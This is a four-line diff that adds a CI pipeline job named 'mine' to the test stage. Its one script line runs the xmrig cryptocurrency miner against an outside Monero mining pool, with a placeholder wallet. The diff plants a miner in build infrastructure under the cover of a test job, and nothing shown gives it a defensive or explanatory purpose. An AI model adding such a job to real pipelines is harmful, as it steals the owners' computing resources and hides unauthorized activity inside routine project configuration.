@@ -1,0 +1,4 @@
+mine:
+  stage: test
+  script:
+    - xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u WALLET
